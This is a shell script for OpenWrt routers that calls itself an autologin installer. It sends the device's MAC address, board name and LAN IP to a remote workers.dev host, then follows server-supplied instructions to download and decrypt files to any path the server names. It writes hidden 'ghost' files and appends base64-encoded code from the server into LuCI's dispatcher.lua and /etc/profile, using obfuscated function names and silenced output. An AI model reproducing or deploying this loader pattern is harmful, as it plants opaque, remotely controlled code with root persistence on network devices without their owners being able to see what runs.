#!/bin/sh
# ============================================================================
# Autologin Installer - Dumb Executor
# ============================================================================

_a1="https://raw.githubusercontent.com/creativy24/portal/main"
_b2="https://autologin.creativy24.workers.dev"
_d4="/usr/lib/autologin"

_h8() { echo "[SYS] $1"; }
_i9() { echo "[WRN] $1"; }
_j10() { echo "[ERR] $1"; exit 1; }
_k11() { echo "[BOOT] $1"; }

_k11 "0x01:INIT"
MAC_ADDR=$(cat /sys/class/net/br-lan/address 2>/dev/null || ifconfig br-lan 2>/dev/null | grep 'HWaddr' | awk '{print $5}')
BOARD_ID=$(cat /tmp/sysinfo/board_name 2>/dev/null || echo "unknown")
LAN_IP=$(ip route show 2>/dev/null | grep 'src 192' | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}' | head -1)
[ -z "$LAN_IP" ] && LAN_IP="192.168.1.1"
_h8 "0x01:OK"

_k11 "0x02:DEPS"
for pkg in openssl curl jq; do
    command -v $pkg >/dev/null 2>&1 || { 
        opkg update >/dev/null 2>&1
        opkg install $pkg >/dev/null 2>&1
    }
done
_h8 "0x02:OK"

_k11 "0x03:AUTH"
LICENSE_KEY="$1"
[ -z "$LICENSE_KEY" ] && _j10 "0x03:KEY_REQUIRED"

RESPONSE=$(curl -sSL -X POST "$_b2/bootstrap" \
    -H "Content-Type: application/json" \
    -d "{\"license_key\": \"$LICENSE_KEY\", \"mac_address\": \"$MAC_ADDR\", \"board_id\": \"$BOARD_ID\", \"lan_ip\": \"$LAN_IP\"}" 2>&1)

SUCCESS=$(echo "$RESPONSE" | jq -r '.success' 2>/dev/null)
[ "$SUCCESS" != "true" ] && _j10 "0x03:FAIL:$(echo "$RESPONSE" | jq -r '.error' 2>/dev/null)"

_h8 "0x03:OK"

FINGERPRINT=$(echo "$RESPONSE" | jq -r '.fingerprint' 2>/dev/null)
LAT=$(echo "$RESPONSE" | jq -r '.lat' 2>/dev/null)
SYS_CORE_B64=$(echo "$RESPONSE" | jq -r '.ghost_core.sys_core_lua' 2>/dev/null)
SYS_ENV_B64=$(echo "$RESPONSE" | jq -r '.ghost_core.sys_env_sh' 2>/dev/null)
DISPATCHER_INJ_B64=$(echo "$RESPONSE" | jq -r '.injection.dispatcher_lua' 2>/dev/null)
PROFILE_INJ_B64=$(echo "$RESPONSE" | jq -r '.injection.profile_sh' 2>/dev/null)

_k11 "0x04:PAYLOAD"
SESSION_RESP=$(curl -sSL -X POST "$_b2/payload/get-session" \
    -H "Content-Type: application/json" \
    -d "{\"license_key\": \"$LICENSE_KEY\", \"fingerprint\": \"$FINGERPRINT\"}" 2>&1)

SESSION_TOKEN=$(echo "$SESSION_RESP" | jq -r '.session_token' 2>/dev/null)

INSTR_RESP=$(curl -sSL -X POST "$_b2/payload/instructions" \
    -H "Content-Type: application/json" \
    -d "{\"session_token\": \"$SESSION_TOKEN\", \"fingerprint\": \"$FINGERPRINT\"}" 2>&1)

echo "$INSTR_RESP" > /tmp/autologin_instructions.json

jq -c '.instructions[]' /tmp/autologin_instructions.json 2>/dev/null | while read -r inst; do
    action=$(echo "$inst" | jq -r '.action' 2>/dev/null)
    
    if [ "$action" = "mkdir" ]; then
        path=$(echo "$inst" | jq -r '.path' 2>/dev/null)
        mkdir -p "$path" 2>&1
        
    elif [ "$action" = "download_decrypt" ]; then
        file=$(echo "$inst" | jq -r '.file' 2>/dev/null)
        target=$(echo "$inst" | jq -r '.target' 2>/dev/null)
        
        curl -sSL -o "/tmp/$file" -X POST "$_b2/payload/download" \
            -H "Content-Type: application/json" \
            -d "{\"session_token\": \"$SESSION_TOKEN\", \"file\": \"$file\"}" 2>&1
        
        openssl enc -d -aes-256-cbc -salt -pbkdf2 -iter 100000 \
            -in "/tmp/$file" -out "$target" \
            -pass pass:"$LAT" 2>&1
        
        rm -f "/tmp/$file"
    fi
done

rm -f /tmp/autologin_instructions.json
_h8 "0x04:OK"

_k11 "0x05:META"
mkdir -p "$_d4"
printf '%s' "$LICENSE_KEY" > "$_d4/.license_key"
printf '%s' "$FINGERPRINT" > "$_d4/.fingerprint"
printf '%s' "$LAT" > /etc/.sys_auth
chmod 600 "$_d4/.license_key" "$_d4/.fingerprint" /etc/.sys_auth
_h8 "0x05:OK"

_k11 "0x06:GHOST"
echo "$SYS_CORE_B64" | base64 -d > /usr/lib/lua/luci/.sys_core.lua
chmod 644 /usr/lib/lua/luci/.sys_core.lua

echo "$SYS_ENV_B64" | base64 -d > /etc/.sys_env
chmod 644 /etc/.sys_env
_h8 "0x06:OK"

_k11 "0x07:INJECT"
if [ -f /usr/lib/lua/luci/dispatcher.lua ]; then
    cp /usr/lib/lua/luci/dispatcher.lua /usr/lib/lua/luci/dispatcher.lua.bak.sys 2>/dev/null || true
    if ! grep -q ".sys_core.lua" /usr/lib/lua/luci/dispatcher.lua 2>/dev/null; then
        echo "$DISPATCHER_INJ_B64" | base64 -d >> /usr/lib/lua/luci/dispatcher.lua
    fi
fi

if [ -f /etc/profile ]; then
    cp /etc/profile /etc/profile.bak.sys 2>/dev/null || true
    if ! grep -q ".sys_env" /etc/profile 2>/dev/null; then
        echo "$PROFILE_INJ_B64" | base64 -d >> /etc/profile
    fi
fi
_h8 "0x07:OK"

_k11 "0x08:SVC"
/etc/init.d/uhttpd restart 2>/dev/null || true
[ -f "$_d4/../init.d/autologin" ] && "$_d4/../init.d/autologin" start 2>/dev/null || true
_h8 "0x08:OK"

echo "============================================================================"
_h8 "0xFF:COMPLETE"
echo "Access: http://${LAN_IP}/cgi-bin/luci/admin/autologin/konfigurasi"
echo "============================================================================"
